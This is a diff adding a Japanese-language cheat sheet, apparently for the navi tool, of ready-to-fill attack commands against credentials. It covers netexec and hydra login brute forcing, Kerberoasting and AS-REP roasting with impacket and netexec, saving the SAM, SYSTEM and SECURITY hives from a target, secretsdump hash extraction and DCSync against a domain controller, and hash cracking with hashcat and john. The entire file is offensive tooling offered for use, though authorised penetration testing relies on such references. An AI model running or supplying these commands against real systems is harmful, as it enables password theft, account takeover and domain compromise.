@@ -1,0 +1,49 @@
+% 資格情報, netexec
+
+# netexec: ユーザーとパスワードを総当たりで試す
+netexec <proto> <host> <brute_how> --continue-on-success <nxc_opt>
+
+
+% 資格情報, hydra
+
+# hydra: Web のログインフォームを総当たり（POST・GET）
+hydra -l <hydra_user> -P <wl_pass> <web> <hydra_form> "/<login_path>:<user_param>=^USER^&<pass_param>=^PASS^<form_extra>:F=<fail_text>" -t 64
+
+
+% 資格情報, kerberoast
+
+# impacket-GetUserSPNs: Kerberoasting（kerberoasting.txt に）
+impacket-GetUserSPNs -dc-ip <dc> <auth_impn> -request -outputfile kerberoasting.txt
+
+
+% 資格情報, asrep
+
+# netexec: AS-REP Roasting（ldap。asrep.txt に）
+netexec ldap <dc> <auth_ldap> --asreproast asrep.txt
+
+
+% 資格情報, reg
+
+# reg: SAM・SYSTEM・SECURITY を保存する（相手で。持ち帰って secretsdump で読む）
+cmd /c "reg save HKLM\SAM <remote_dir>\SAM & reg save HKLM\SYSTEM <remote_dir>\SYSTEM & reg save HKLM\SECURITY <remote_dir>\SECURITY"
+
+
+% 資格情報, secretsdump
+
+# impacket-secretsdump: 持ち帰ったハイブから、ローカルのハッシュと LSA シークレット（キャッシュ資格情報）を抜く
+(cd <hive_dir> && impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL)
+
+# impacket-secretsdump: DC から抜く（DCSync で NTDS・SAM・LSA シークレット。パスワード・ハッシュ・チケット）
+impacket-secretsdump <auth_dump>
+
+
+% 資格情報, hashcat
+
+# hashcat: ハッシュを rockyou で割る（モードの一覧にハッシュの見分け方）
+hashcat -m <mode> <crackfile> /usr/share/wordlists/rockyou.txt
+
+
+% 資格情報, john
+
+# john: ハッシュを rockyou で割る（john が形式を自動判別）
+john --wordlist=/usr/share/wordlists/rockyou.txt <crackfile>
